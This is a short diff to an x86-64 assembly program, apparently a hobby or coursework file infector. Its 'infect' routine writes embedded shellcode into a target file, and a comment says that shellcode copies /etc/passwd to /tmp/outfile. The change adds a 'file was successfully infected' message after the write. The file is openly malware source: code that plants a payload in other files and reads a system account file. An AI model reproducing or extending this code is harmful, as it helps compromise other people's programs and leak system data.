@@ -23,6 +23,9 @@ section .data
     miss_msg db "The provided file does not exist.", 10
     miss_len equ $ - miss_msg
 
+    after_infect_msg db "The provided file was successfully infected.", 10
+    after_infect_len equ $ - after_infect_msg
+
     ; Inspired by https://shell-storm.org/shellcode/files/shellcode-867.html, still copies /etc/passwd to /tmp/outfile but replaced some registers and added instructions
     shellcode db 0x54, 0x56, 0x57, 0x50, 0x53, 0x52 ; push rsp, push rsi, push rdi, push rax, push rbx, push rdx
         db 0x48, 0x81, 0xec, 0x00, 0x10, 0x00, 0x00 ; sub rsp, 0x1000
@@ -317,6 +320,12 @@ infect:
     mov rsi, shellcode
     mov rdx, shellcode_len
     mov r10, [file_size]
+    syscall
+
+    mov rax, 1          
+    mov rdi, 1
+    mov rsi, after_infect_msg
+    mov rdx, after_infect_len
     syscall
 
     jmp close
